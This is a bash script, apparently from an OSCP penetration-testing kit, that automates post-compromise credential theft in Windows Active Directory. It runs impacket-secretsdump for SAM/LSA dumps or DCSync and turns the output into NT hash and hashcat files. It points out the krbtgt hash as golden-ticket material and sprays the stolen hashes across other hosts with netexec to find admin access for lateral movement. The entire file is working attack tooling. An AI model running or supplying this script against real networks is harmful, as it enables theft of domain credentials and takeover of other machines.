#!/bin/bash
# --- self-locate kit root (survives moving the whole tree) ---
KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
# ad-secretsdump.sh — OSCP post-compromise credential dump + reuse.
# Runs impacket-secretsdump (remote SAM/LSA or full DCSync against a DC),
# parses the output into ready-to-use hash/cred files, and optionally sprays
# the recovered NT hashes across other exam hosts to find lateral movement.
#
# Usage:
#   ad-secretsdump.sh -t <target-IP> [-d domain] [-u user] [-p pass | -H nthash]
#                     [-l] [-n name] [-S hosts.txt]
#   -t  target to dump (DC for DCSync, or any host for local SAM/LSA)
#   -d  domain (omit or use '.' for a LOCAL account / workgroup host)
#   -u  username        -p  password        -H  NT hash (pass-the-hash)
#   -l  local auth (-local-auth: authenticate against the box's SAM, not the domain)
#   -n  workspace name under targets/ (default: <target>)
#   -S  hosts file — after dumping, spray every recovered NT hash across these
#       hosts with netexec (finds where else the creds work). Admin => (Pwn3d!)
#
# Examples:
#   # DCSync with Domain Admin creds:
#   ./ad-secretsdump.sh -t 10.10.10.5 -d corp.local -u Administrator -p 'DAPass!'
#   # Local SAM dump via pass-the-hash on a standalone host:
#   ./ad-secretsdump.sh -t 10.10.10.20 -u Administrator -H <nthash> -l
#   # Dump then spray recovered hashes across the subnet:
#   ./ad-secretsdump.sh -t 10.10.10.5 -d corp.local -u adm -p Pass1 -S hosts.txt

set -o pipefail
TARGET=""; DOMAIN=""; USER=""; PASS=""; HASH=""; LOCAL=0; NAME=""; SPRAY_HOSTS=""
while getopts "t:d:u:p:H:ln:S:h" o; do case "$o" in
  t) TARGET=$OPTARG;; d) DOMAIN=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;;
  H) HASH=$OPTARG;; l) LOCAL=1;; n) NAME=$OPTARG;; S) SPRAY_HOSTS=$OPTARG;;
  h|*) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
esac; done

[ -z "$TARGET" ] || [ -z "$USER" ] && { echo "[!] -t <target> and -u <user> required. -h for help."; exit 1; }
{ [ -z "$PASS" ] && [ -z "$HASH" ]; } && { echo "[!] Provide -p <pass> or -H <nthash>."; exit 1; }
[ -z "$NAME" ] && NAME=$TARGET
OUT="${WORKDIR:-$KIT/targets}/$NAME/loot"
mkdir -p "$OUT"
log(){ echo -e "\n\033[1;34m[*] $1\033[0m"; }

# Build impacket target string:  [domain/]user[:pass]@target   (+ -hashes for PtH)
PRE="$USER"; [ -n "$DOMAIN" ] && [ "$LOCAL" = 0 ] && PRE="$DOMAIN/$USER"
IMPARGS=()
if [ -n "$HASH" ]; then IMPARGS+=(-hashes ":$HASH"); TGT="${PRE}@${TARGET}"
else TGT="${PRE}:${PASS}@${TARGET}"; fi
[ "$LOCAL" = 1 ] && IMPARGS+=(-local-auth)

echo "=================================================="
echo " SECRETSDUMP   target=$TARGET  as=${DOMAIN:+$DOMAIN/}$USER  local=$LOCAL"
echo " output -> $OUT"
echo "=================================================="

log "Running impacket-secretsdump"
RAW="$OUT/secretsdump_$TARGET.txt"
impacket-secretsdump "${IMPARGS[@]}" "$TGT" 2>&1 | tee "$RAW"
if ! grep -qiE 'Dumping|:::' "$RAW"; then
  echo -e "\n[!] No secrets dumped — check creds/privileges (need admin/DA). See $RAW"; exit 2
fi

log "Parsing recovered material"
# NTLM hashes in pwdump format ( user:rid:lm:nt:::  )  -> user:nthash for reuse
grep -E '^[^:]+:[0-9]+:[a-f0-9]{32}:[a-f0-9]{32}:::' "$RAW" > "$OUT/ntds_pwdump.txt" 2>/dev/null
awk -F: 'NF>=4{u=$1; sub(/^.*\\/,"",u); print u":"$4}' "$OUT/ntds_pwdump.txt" 2>/dev/null | sort -u > "$OUT/nt_hashes.txt"
# hashcat-ready (just the NT hash, -m 1000)
awk -F: '{print $2}' "$OUT/nt_hashes.txt" 2>/dev/null | sort -u > "$OUT/nt_hashes_hashcat.txt"
# cleartext creds secretsdump sometimes recovers (CLEARTEXT / plaintext)
grep -iE 'CLEARTEXT|:CLEARTEXT|password' "$RAW" | grep -iv 'dumping' > "$OUT/cleartext.txt" 2>/dev/null

NC=$(wc -l < "$OUT/nt_hashes.txt" 2>/dev/null || echo 0)
echo "  [+] $NC accounts -> $OUT/nt_hashes.txt   (user:nthash)"
echo "      hashcat -m 1000 $OUT/nt_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt"
[ -s "$OUT/cleartext.txt" ] && echo "  [+] possible cleartext -> $OUT/cleartext.txt"
# surface the krbtgt hash (golden-ticket material) if present
grep -i '^krbtgt:' "$OUT/ntds_pwdump.txt" 2>/dev/null && echo "      ^ krbtgt hash (golden ticket)"

# --- optional: spray recovered NT hashes across other hosts ---
if [ -n "$SPRAY_HOSTS" ]; then
  [ -f "$SPRAY_HOSTS" ] || { echo "[!] hosts file $SPRAY_HOSTS not found."; exit 0; }
  log "Lateral spray: recovered hashes vs $(basename "$SPRAY_HOSTS")"
  SPRAYOUT="$OUT/lateral_spray.txt"; : > "$SPRAYOUT"
  while IFS=: read -r u h; do
    [ -z "$u" ] || [ -z "$h" ] && continue
    echo "  -> $u / $h" 
    netexec smb "$SPRAY_HOSTS" -u "$u" -H "$h" --continue-on-success 2>&1 \
      | grep -E '\[\+\]|Pwn3d' | tee -a "$SPRAYOUT"
  done < "$OUT/nt_hashes.txt"
  echo; echo "  [+] admin/valid hits -> $SPRAYOUT"
  grep -i 'Pwn3d' "$SPRAYOUT" 2>/dev/null && echo "      ^ (Pwn3d!) = local admin — evil-winrm / psexec these."
fi

echo -e "\n\033[1;32m[+] Post-compromise dump complete. Loot in $OUT\033[0m"
ls -la "$OUT"
